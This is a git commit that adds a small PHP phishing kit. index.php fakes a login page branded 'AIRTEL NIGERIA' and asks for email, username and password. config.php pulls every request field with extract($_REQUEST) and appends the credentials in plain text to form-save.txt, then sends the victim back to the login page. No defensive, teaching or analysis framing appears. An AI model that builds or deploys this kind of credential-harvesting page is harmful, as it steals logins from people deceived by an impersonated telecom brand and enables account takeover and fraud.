f4ba5d7019abf4d17f269d433575267c08af46b3
AJAYISK <91030156+AJAYISK@users.noreply.github.com>
2021-11-29 13:06:19 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,13 @@
+<?php
+    extract($_REQUEST);
+    $file=fopen("form-save.txt","a");
+
+    fwrite($file,"name :");
+    fwrite($file, $username ."\n");
+    fwrite($file,"password :");
+    fwrite($file, $password ."\n");
+    fwrite($file, "email:");
+    fwrite($file, $email ."\n");
+    fclose($file);
+    header("location:index.php");
+ ?>
---
+++ index.php
@@ -0,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<link rel ="stylesheet" type="text/css" href="index.css">
+
+<body>
+<div>
+    <H1><span>AIRTEL</span>NIGERIA</H1>
+<div>
+<form action="config.php" >
+        <h2>USER LOGIN </h2>
+        <input type="email" name="email" id="email" placeholder="email" required>   
+        <br>
+    <input type="text" name="username" id="username" placeholder="username" required>
+    <br>
+    <input type="password" name="password" id="password" placeholder="password">
+    <br>
+    <input type="submit" value="Login" name="Login">
+    <p><a href="index2.php" >create account?</a></p>
+</form>
+<p id="demo"></p>
+</div>
+</div>
+<br>
+<br>
+<br>
+<br>
+
+
+</body>
+</html>
